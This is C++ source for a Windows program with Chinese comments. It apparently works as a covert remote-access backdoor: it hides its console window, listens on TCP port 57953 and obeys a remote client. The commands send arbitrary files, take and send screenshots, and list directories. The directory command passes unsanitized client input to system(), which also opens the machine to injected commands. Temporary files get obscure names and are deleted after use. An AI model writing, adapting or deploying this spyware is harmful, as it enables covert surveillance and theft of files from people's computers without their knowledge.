#include <WS2tcpip.h>
#include <stdio.h>
#include <atlimage.h>
#pragma comment(lib,"ws2_32.lib")
int Work(SOCKET& ListenSocket, SOCKET& ClientSocket);
void FileSend(const char filename[], SOCKET& ListenSocket, SOCKET& ClientSocket);
void CaptureScreen(SOCKET& ListenSocket, SOCKET& ClientSocket);
void error(SOCKET& ClientSocket, const char err[]);
void Dir(SOCKET& ListenSocket, SOCKET& ClientSocket, const char* url);
char recData[255];
int main(int argc, char* argv[])								//主函数
{
	while (1) {
		ShowWindow(GetConsoleWindow(), SW_HIDE);				//控件台窗口最小化。
		/*::::::::初始化Winsock服务::::::::*/
		unsigned short sockVersion = MAKEWORD(2, 2);			//sock版本
		WSADATA data;
		if (WSAStartup(sockVersion, &data) != 0) {				//WSAStartup()异步套接字函数,完成Winsock服务初始化
			printf("%s\n", "Version Failed!"); continue;		//故障报错:版本出错//重新初始程序
		}
		/*::::::::套接字ListenSocket(接听)(本,服务器端)::::::::*/
		SOCKET ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);//分配套接字接口ListenSocket
		if (ListenSocket == INVALID_SOCKET) {					//故障报错:套接口分配出错
			error(ListenSocket, "socket Failed!"); continue;	//释放ListenSocket套接字//重新初始程序
		}
		SOCKADDR_IN  ServAddr;									//结构体SOCKADDR_IN
		ServAddr.sin_family = AF_INET;							//sin_family:协议族(socket编程只AF_INET)
		ServAddr.sin_addr.s_addr = INADDR_ANY;					//sin_addr:IP地址		
		ServAddr.sin_port = htons(57953);						//sin_port:端口号(网络字节顺序);htons()字节顺序倒转函数
		if (bind(ListenSocket, (SOCKADDR*)&ServAddr, sizeof(ServAddr)) != 0) {//bind()地址ServAddr与套接口ListenSocket捆绑//故障报错:捆绑失败
			error(ListenSocket, "bind Failed!"); continue;		//释放ListenSocket套接字//重新初始程序
		}
		if (listen(ListenSocket, 3) != 0) {						//listen()让套接字进入被动监听状态,backlog请求队列最大长度//故障报错
			error(ListenSocket, "listen Failed!"); continue;	//释放ListenSocket套接字//重新初始程序
		}
		/*::::::::套接字ClientSocket(对方监控端(客户端))::::::::*/
		SOCKET ClientSocket;									//创建套接字ClientSocket
		sockaddr_in ClientAddr;									//结构体SOCKADDR_IN
		int len = sizeof(struct sockaddr);
		ClientSocket = accept(ListenSocket, (struct sockaddr*) & ClientAddr, &len);//accept()接收ListenSocket中建立的连接,存至ClientSocket
		if (ClientSocket == INVALID_SOCKET) {					//故障报错
			error(ClientSocket, "ClientSocket Connect error");	//释放ClientSocket套接字
			error(ListenSocket, ""); continue;					//释放ListenSocket套接字//重新初始程序
		}
		/*::::::::工作::::::::*/
		while (1) {
			int temp = Work(ListenSocket, ClientSocket);		//循环,工作
			if (temp == -1)break;								//标记启动关闭连接
		}error(ListenSocket, "");
	}return 0;
}
bool StrCmp(const char a[], const char b[])
{
	for (unsigned int i = 0; i < strlen(b); i++) {
		if (a[i] != b[i])return false;
	}return true;
}
int Work(SOCKET& ListenSocket, SOCKET& ClientSocket)			//工作, 指令处理
{
	int ret = recv(ClientSocket, recData, 250, 0);				//接收指令
	if (ret > 0) recData[ret] = '\0';							//字符串结尾加'\0'
	switch (recData[0]) {										//分析接收的指令
	case '\0':return 1;											//无指令,退出
	case 'd':
		if (StrCmp(recData, "dir")) {						//[dir "url"]指令: 查询文件列表
			Dir(ListenSocket, ClientSocket, recData + 4);
		}
	case 'f':
		if (StrCmp(recData, "file")) {						//[file "url"]指令: 文件传输
			FileSend(recData + 5, ListenSocket, ClientSocket);//文件传输
		}
	case 'q':
		if (StrCmp(recData, "quit")) {						//[quit]指令: 断开连接
			error(ClientSocket, "Close ClientSocket");return -1;//释放ClientSocket套接字
		}
	case 'r':
		if (StrCmp(recData, "request")) {					//[request]指令: 询问
			send(ClientSocket, "reply", strlen("reply"), 0);	//回复"reply"
		}
	case 's':
		if (StrCmp(recData, "screen")) {					//[screen]指令: 屏幕截图
			CaptureScreen(ListenSocket, ClientSocket);									//屏幕截图
		}
	default:send(ClientSocket, recData, strlen(recData), 0);	//其他指令: 回复复读
	}recData[0] = '\0'; return 1;
}
char buffer[65535];												//缓存数组
void FileSend(const char filename[], SOCKET& ListenSocket, SOCKET& ClientSocket)//文件传输
{
	FILE* fp = fopen(filename, "rb");							//打开文件
	if (fp == NULL) {
		char temp[] = "Not Find File";
		send(ClientSocket, temp, strlen(temp), 0); return;
	}
	memset(buffer, 0, sizeof(buffer));							//清零缓存数组
	int length = 0;
	while ((length = fread(buffer, sizeof(char), sizeof(buffer), fp)) > 0) {//逐节传递(每次65535B)
		if (send(ClientSocket, buffer, length, 0) == SOCKET_ERROR) {//故障报错
			printf("Send File: %s Failed\n", filename);
			printf("error num : %d\n", GetLastError()); return;
		}memset(buffer, 0, sizeof(buffer));						//清零缓存数组
	}fclose(fp);												//关闭文件
}
void CaptureScreen(SOCKET& ListenSocket, SOCKET& ClientSocket)	//屏幕截图
{
	int nScreenWidth = GetSystemMetrics(SM_CXSCREEN);			//屏幕宽度
	int nScreenHeight = GetSystemMetrics(SM_CYSCREEN);			//屏幕长度
	HWND hDesktopWnd = GetDesktopWindow();						//HWND窗口句柄//GetDesktopWindow()返回桌面窗口的句柄
	HDC hDesktopDC = GetDC(hDesktopWnd);						//HDC设备上下文句柄//检索指定窗口显示设备上下文环境的句柄
	CImage image;												//创建图片变量
	image.Create(nScreenWidth, nScreenHeight, GetDeviceCaps(hDesktopDC, BITSPIXEL));//图片初始化
	BitBlt(image.GetDC(), 0, 0, nScreenWidth, nScreenHeight, hDesktopDC, 0, 0, SRCCOPY);
	::ReleaseDC(NULL, hDesktopDC);								//释放句柄
	image.ReleaseDC();											//释放句柄
	image.Save(_T("D:/80asdfg0s9d8fs089dfs089dfud9v7byh29487rydcv9bc8y2iy3gr.jpg"));//保存屏幕截图
	FileSend("D:/80asdfg0s9d8fs089dfs089dfud9v7byh29487rydcv9bc8y2iy3gr.jpg", ListenSocket, ClientSocket);//屏幕截图传输
	DeleteFile(_T("D:/80asdfg0s9d8fs089dfs089dfud9v7byh29487rydcv9bc8y2iy3gr.jpg"));//删除屏幕截图 (避免替换已存在文件)
}
void Dir(SOCKET& ListenSocket, SOCKET& ClientSocket, const char* url)
{
	char temp[1000] = "dir ";
	if(strcmp(url,"")==0)strcat(temp, "D:\\");
	else strcat(temp, url);
	strcat(temp, "> D:/80asdfg0s9d8fs089dfs089dfud9v7byh29487rydcv9bc8y2iy3gr.txt");
	send(ClientSocket, temp, strlen(temp), 0);
	system(temp);
	FileSend("D:/80asdfg0s9d8fs089dfs089dfud9v7byh29487rydcv9bc8y2iy3gr.txt", ListenSocket, ClientSocket);//文件传输
	DeleteFile(_T("D:/80asdfg0s9d8fs089dfs089dfud9v7byh29487rydcv9bc8y2iy3gr.txt"));//删除屏幕截图 (避免替换已存在文件)
}
void error(SOCKET& Socket, const char err[])					//报错, 结束
{
	printf("%s\n", err);										//打印错误信息
	WSACleanup(); closesocket(Socket);							//终止Winsock2.dll使用//释放套接字
}